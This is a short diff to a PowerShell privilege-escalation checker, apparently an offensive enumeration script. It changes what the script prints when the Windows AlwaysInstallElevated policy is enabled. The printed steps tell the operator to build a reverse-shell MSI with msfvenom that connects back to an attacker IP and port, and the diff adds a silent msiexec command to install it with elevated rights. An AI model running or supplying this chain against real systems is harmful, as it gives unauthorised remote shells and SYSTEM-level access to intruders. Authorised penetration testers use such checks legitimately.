@@ -715,8 +715,8 @@ function Check-AlwaysInstallElevated {
     if ($result -eq $true){
         write-host "  + Possible escalation of privileges" -ForegroundColor green
         write-host "AlwaysInstallElevated is activated"
-        write-host "   1. Create a reverse shell msi: msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attackerip] LPORT=53 -f msi -o reverse.msi"
-        write-host "   2. Download file in windows and execute"
+        write-host "   1. Create a reverse shell msi: msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attackerip] LPORT=[attackerport] -f msi -o reverse.msi"
+        write-host "   2. Download file in windows and execute: msiexec /quiet /qn /i reverse.msi"
     } else {
        write-host "  - Not possible escalation of privileges" -ForegroundColor red 
     }
